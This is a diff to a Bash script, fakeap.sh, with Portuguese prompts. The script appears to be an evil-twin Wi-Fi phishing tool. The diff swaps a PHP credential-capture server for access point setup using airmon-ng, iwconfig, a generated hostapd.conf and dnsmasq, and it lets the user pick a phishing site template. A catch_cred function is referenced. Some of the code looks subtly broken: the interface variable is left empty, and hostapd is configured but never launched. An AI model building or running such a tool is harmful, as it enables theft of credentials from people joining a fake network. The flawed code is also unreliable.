@@ -90,15 +90,10 @@ start() {
     mkdir sites
   fi
 
-  counter=1
-  for folder in sites/*/; do
-    folder_name=$(basename "$folder")
-    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$folder_name"
-    let counter++
-  done
+  find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("\e[1;92m%d\e[0m: \e[1;77m%s\n", NR, $1)}'
 
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta:\e[0m ' chosen_folder_number
-  chosen_folder=$(find sites/ -maxdepth 1 -type d | sed -n "${chosen_folder_number}p")
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta pelo número:\e[0m ' chosen_folder_number
+  chosen_folder=$(find sites/ -maxdepth 1 -mindepth 1 -type d | sed -n "${chosen_folder_number}p")
 
   if [ -z "$chosen_folder" ]; then
     printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
@@ -107,15 +102,34 @@ start() {
 
   interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)
 
-  IFS=$'\n'
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel
-  createpage "$chosen_folder"
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Finalizado: ./fakeap.sh --stop\n"
-  printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php...\n"
-  php -S 192.168.1.1:80 > /dev/null 2>&1 & 
-  sleep 2
-  getcredentials
+
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o access point...\n"
+
+  service network-manager stop
+  airmon-ng check kill
+  ifconfig $interface down
+  iwconfig $interface mode monitor
+  ifconfig $interface up
+  iwconfig $interface channel $use_channel
+  iwconfig $interface essid $use_ssid
+  ifconfig $interface up
+
+  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\n"
+  
+  echo "interface=$interface" > hostapd.conf
+  echo "driver=nl80211" >> hostapd.conf
+  echo "ssid=$use_ssid" >> hostapd.conf
+  echo "hw_mode=g" >> hostapd.conf
+  echo "channel=$use_channel" >> hostapd.conf
+  echo "macaddr_acl=0" >> hostapd.conf
+  echo "auth_algs=1" >> hostapd.conf
+  echo "ignore_broadcast_ssid=0" >> hostapd.conf
+  
+  dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+  sleep 5
+  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Para parar: ./fakeap.sh --stop\n"
 }
 
 catch_cred() {
